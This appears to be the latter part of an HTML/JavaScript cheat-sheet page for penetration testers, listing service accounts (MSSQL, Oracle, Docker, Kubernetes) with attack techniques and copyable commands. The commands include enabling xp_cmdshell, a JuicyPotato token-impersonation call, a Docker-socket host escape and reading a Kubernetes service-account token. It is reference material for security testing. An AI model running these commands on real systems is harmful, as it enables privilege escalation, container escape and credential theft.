                        permissions: [
                            "SeImpersonatePrivilege (common)",
                            "Access to SQL Server data and logs",
                            "May have sysadmin role in SQL",
                            "Often domain account with SPN"
                        ],
                        commonServices: "Microsoft SQL Server",
                        securityNote: "SeImpersonatePrivilege enables token impersonation attacks (Juicy Potato, PrintSpoofer). Check for xp_cmdshell and linked servers.",
                        critical: true,
                        techniques: [
                            "Token impersonation (Potato exploits)",
                            "xp_cmdshell command execution",
                            "Linked server attacks",
                            "Kerberoasting if domain account",
                            "OLE automation for RCE"
                        ],
                        commands: [
                            "-- Check service account",
                            "SELECT SYSTEM_USER, USER_NAME();",
                            "EXEC xp_loginconfig 'default domain';",
                            "",
                            "-- Enable xp_cmdshell",
                            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                            "",
                            "-- Execute commands",
                            "EXEC xp_cmdshell 'whoami';",
                            "",
                            "-- Check for impersonation",
                            "SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';",
                            "",
                            "# Token impersonation on Windows",
                            "JuicyPotato.exe -t * -p C:\\windows\\system32\\cmd.exe -a \"/c whoami > C:\\temp\\proof.txt\" -l 1337"
                        ]
                    },
                    {
                        name: "Oracle Database Service Account",
                        privilege: "high",
                        description: "Account running Oracle database instance. Has access to all database files and configurations.",
                        permissions: [
                            "Full access to Oracle data files",
                            "Access to Oracle configuration",
                            "May have OS authentication",
                            "Can execute OS commands via Java or external procedures"
                        ],
                        commonServices: "Oracle Database",
                        securityNote: "Check for Java stored procedures, external procedure execution, and UTL_FILE for file operations.",
                        techniques: [
                            "Execute OS commands via Java stored procedures",
                            "UTL_FILE for file read/write",
                            "Access to password hashes",
                            "Exploit DEFAULT credentials"
                        ],
                        commands: [
                            "-- Check user",
                            "SELECT USER FROM DUAL;",
                            "SELECT SYS_CONTEXT('USERENV', 'OS_USER') FROM DUAL;",
                            "",
                            "-- Create Java stored procedure for command execution",
                            "CREATE OR REPLACE JAVA SOURCE NAMED \"OSCommand\" AS",
                            "-- [Java code for Runtime.exec()]",
                            "",
                            "-- UTL_FILE for file operations",
                            "SELECT UTL_FILE.FGETATTR('DIRECTORY','filename') FROM DUAL;"
                        ]
                    }
                ]
            },
            {
                category: "Container & Orchestration",
                icon: "üì¶",
                accounts: [
                    {
                        name: "Docker Container Root",
                        privilege: "system",
                        description: "Default user inside Docker containers (UID 0). Not root on host unless container escape.",
                        permissions: [
                            "Root inside container namespace",
                            "Limited by container capabilities",
                            "May be restricted by AppArmor/SELinux",
                            "Can access mounted volumes"
                        ],
                        commonServices: "Docker containers",
                        securityNote: "Check for privileged containers, dangerous capabilities (CAP_SYS_ADMIN), and host filesystem mounts.",
                        critical: true,
                        techniques: [
                            "Container escape via CVEs",
                            "Abuse mounted Docker socket",
                            "Exploit privileged containers",
                            "Abuse dangerous capabilities",
                            "Access host filesystem via mounts"
                        ],
                        commands: [
                            "# Check if in container",
                            "cat /proc/1/cgroup | grep docker",
                            "ls -la /.dockerenv",
                            "",
                            "# Check capabilities",
                            "capsh --print",
                            "cat /proc/self/status | grep Cap",
                            "",
                            "# Check for Docker socket",
                            "ls -la /var/run/docker.sock",
                            "",
                            "# Escape via mounted socket",
                            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                            "",
                            "# Check mounts",
                            "mount | grep -v 'type tmpfs\\|type proc\\|type sysfs'",
                            "",
                            "# Look for host filesystem mounts",
                            "df -h"
                        ]
                    },
                    {
                        name: "Kubernetes Pod Security Context User",
                        privilege: "varies",
                        description: "User specified in pod securityContext. Can be root or non-root UID.",
                        permissions: [
                            "Defined by securityContext",
                            "May have fsGroup for volume access",
                            "Capabilities can be added/dropped",
                            "Can be privileged or unprivileged"
                        ],
                        commonServices: "Kubernetes pods",
                        securityNote: "Check runAsUser, runAsNonRoot, privileged flags. Look for overprivileged pods and hostPath mounts.",
                        techniques: [
                            "Exploit privileged pods",
                            "Abuse hostPath mounts",
                            "Node access via hostNetwork/hostPID",
                            "Service account token theft",
                            "Container escape techniques"
                        ],
                        commands: [
                            "# Check current user",
                            "id",
                            "",
                            "# Check if privileged",
                            "cat /proc/self/status | grep Cap",
                            "",
                            "# Check mounts",
                            "mount",
                            "",
                            "# Check for host access",
                            "ls -la /host  # common hostPath mount",
                            "",
                            "# Service account token",
                            "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
                        ]
                    }
                ]
            }
        ];

        function renderCategories() {
            const container = document.getElementById('categories');
            container.innerHTML = '';

            serviceAccounts.forEach((cat, catIndex) => {
                const categoryDiv = document.createElement('div');
                categoryDiv.className = 'category';
                categoryDiv.dataset.category = cat.category;

                let accountsHTML = '';
                cat.accounts.forEach((account) => {
                    const privilegeClass = `badge-${account.privilege}`;
                    const accountHTML = `
                        <div class="service-account" data-account="${account.name.toLowerCase()}">
                            <div class="account-header">
                                <div class="account-name" onclick="copyToClipboard('${escapeHtml(account.name)}')">${escapeHtml(account.name)}</div>
                                <span class="privilege-badge ${privilegeClass}">${account.privilege} privilege</span>
                            </div>

                            ${account.uid ? `<div class="info-row"><span class="info-label">UID:</span><span class="info-value">${account.uid}</span></div>` : ''}
                            ${account.gid ? `<div class="info-row"><span class="info-label">GID:</span><span class="info-value">${account.gid}</span></div>` : ''}
                            ${account.commonServices ? `<div class="info-row"><span class="info-label">Common Services:</span><span class="info-value">${account.commonServices}</span></div>` : ''}

                            <div class="description">${account.description}</div>

                            ${renderPermissions(account.permissions)}

                            ${account.securityNote ? `<div class="security-note ${account.critical ? 'critical' : ''}">${account.critical ? 'üî¥ ' : '‚ö†Ô∏è '}<strong>Security Note:</strong> ${account.securityNote}</div>` : ''}

                            ${renderTechniques(account.techniques)}

                            ${renderCommands(account.commands)}
                        </div>
                    `;
                    accountsHTML += accountHTML;
                });

                categoryDiv.innerHTML = `
                    <div class="category-header" onclick="toggleCategory(${catIndex})">
                        <h2>${cat.icon} ${cat.category}</h2>
                        <span class="toggle-icon">‚ñº</span>
                    </div>
                    <div class="category-content">
                        ${accountsHTML}
                    </div>
                `;

                container.appendChild(categoryDiv);
            });

            updateStats();
        }

        function renderPermissions(permissions) {
            if (!permissions) return '';
            return `
                <div class="permissions-list">
                    <strong>Key Permissions:</strong>
                    <ul>
                        ${permissions.map(p => `<li>${p}</li>`).join('')}
                    </ul>
                </div>
            `;
        }

        function renderTechniques(techniques) {
            if (!techniques) return '';
            return `
                <div class="exploit-techniques">
                    <h4>üéØ Attack Techniques:</h4>
                    <ul>
                        ${techniques.map(t => `<li>${t}</li>`).join('')}
                    </ul>
                </div>
            `;
        }

        function renderCommands(commands) {
            if (!commands) return '';
            const commandText = Array.isArray(commands) ? commands.join('\n') : commands;
            return `
                <div class="code-block" onclick="copyToClipboard(\`${escapeForTemplate(commandText)}\`)">${escapeHtml(commandText)}</div>
            `;
        }

        function toggleCategory(index) {
            const categories = document.querySelectorAll('.category');
            categories[index].classList.toggle('collapsed');
        }

        function expandAll() {
            document.querySelectorAll('.category').forEach(cat => {
                cat.classList.remove('collapsed');
            });
        }

        function collapseAll() {
            document.querySelectorAll('.category').forEach(cat => {
                cat.classList.add('collapsed');
            });
        }

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showToast('Copied to clipboard!');
            });
        }

        function showToast(message) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.classList.add('show');
            setTimeout(() => {
                toast.classList.remove('show');
            }, 2000);
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function escapeForTemplate(text) {
            return text.replace(/`/g, '\\`').replace(/\$/g, '\\$');
        }

        function search(query) {
            query = query.toLowerCase().trim();
            let visibleAccounts = 0;

            document.querySelectorAll('.category').forEach(category => {
                let categoryHasVisible = false;

                category.querySelectorAll('.service-account').forEach(account => {
                    const accountText = account.textContent.toLowerCase();
                    const accountName = account.dataset.account;

                    if (!query || accountText.includes(query) || accountName.includes(query)) {
                        account.classList.remove('hidden');
                        categoryHasVisible = true;
                        visibleAccounts++;
                    } else {
                        account.classList.add('hidden');
                    }
                });

                if (categoryHasVisible) {
                    category.classList.remove('hidden');
                    category.classList.remove('collapsed');
                } else {
                    category.classList.add('hidden');
                }
            });

            const totalAccounts = serviceAccounts.reduce((sum, cat) => sum + cat.accounts.length, 0);
            document.getElementById('visibleCount').textContent =
                `Showing ${visibleAccounts} of ${totalAccounts} service accounts`;
        }

        function updateStats() {
            const totalAccounts = serviceAccounts.reduce((sum, cat) => sum + cat.accounts.length, 0);
            document.getElementById('visibleCount').textContent = `${totalAccounts} service accounts available`;
        }

        document.getElementById('searchBox').addEventListener('input', (e) => {
            search(e.target.value);
        });

        // Initialize
        renderCategories();

        // Keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 'f') {
                e.preventDefault();
                document.getElementById('searchBox').focus();
            }
            if (e.key === 'Escape') {
                document.getElementById('searchBox').value = '';
                search('');
            }
        });
    </script>
</body>
</html>
